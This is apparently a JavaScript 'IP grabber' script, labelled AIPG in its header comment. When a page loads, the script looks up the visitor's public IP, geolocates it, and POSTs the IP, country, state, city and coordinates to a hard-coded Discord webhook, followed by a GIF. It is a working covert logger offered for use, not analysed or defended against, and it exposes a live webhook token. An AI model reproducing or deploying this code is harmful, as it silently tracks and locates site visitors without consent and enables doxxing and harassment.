// Get the current URL

/*

AIPG - Average IP Grabber 

Created by Infdevv

Requested by Kitzoon

*/

var currentURL = window.location.href;
currentURL=("https://scriptbros.github.io/Kitzoon.github.io/")


if (currentURL != "https://scriptbros.github.io/Kitzoon.github.io/"){
    window.location=("https://infdev.one")
}
else{


$(document).ready(function() {
    // Function to get the public IP address
    function getPublicIP() {
      $.get("https://api.ipify.org?format=json", function(data) {
        const publicIP = data.ip;
        $("#public-ip").text(publicIP);
        console.log("Public IP address:", publicIP);
        $.get(('https://api.hackertarget.com/geoip/?q=' + publicIP), function(data) {
  // Convert key-value pairs to JSON
  // https://stackoverflow.com/a/39284735/452587
  data = data.trim().split('\n').reduce(function(obj, pair) {
    pair = pair.split(': ');
    return obj[pair[0]] = pair[1], obj;
  }, {});
  console.log(data);
  document.getElementById("id_spot").innerHTML=((data["City"] + ", " + data["State"]))
  var webhookUrl = " https://discord.com/api/webhooks/1153072190053433496/V_AZJ7avFCBRzt6wJqx4rrFgAmA_XKWfgT5F4SWJBQF3L1belO3H49RTJGdV2dj2-kqq/github";

// Data to send in the embed message
embedData = {
    username: 'Logger | Built by infdevv',
  avatar_url: 'https://cdn.discordapp.com/attachments/1150405810812366850/1153057467140407446/image.png',
    "embeds": [
        {
            "title": "You got mail!",
            "description": (( " IP Address :" + data["IP Address"] + "\n Country: " + data["Country"] + "\n State/Province: " + data["State"] + "\n City: " + data["City"] + "\n Lattitude: " + data["Latitude"] + "\n Longitude: " + data["Longitude"] ))
        }
    ]
};


$.ajax({
    type: "POST",
    url: webhookUrl,
    contentType: "application/json",
    data: JSON.stringify(embedData),
    success: function() {
        console.log("Embed message sent successfully.");
        embed={
    username: 'Logger | Built by infdevv',
  avatar_url: 'https://cdn.discordapp.com/attachments/1150405810812366850/1153057467140407446/image.png',
    content:"https://cdn.discordapp.com/attachments/1148097958085136424/1153056788657213450/ezgif-3-e1491f0965.gif"
}

$.ajax({
    type: "POST",
    url: webhookUrl,
    contentType: "application/json",
    data: JSON.stringify(embed),
    success: function() {
        console.log("Embed message sent successfully.");
    },
    error: function(xhr, status, error) {
        console.error("Error sending embed message: " + error);
    }
});
    },
    error: function(xhr, status, error) {
        console.error("Error sending embed message: " + error);
    }
});



});
      });
    }

    // Call the function to get and display the public IP address
    getPublicIP();
  });



        }
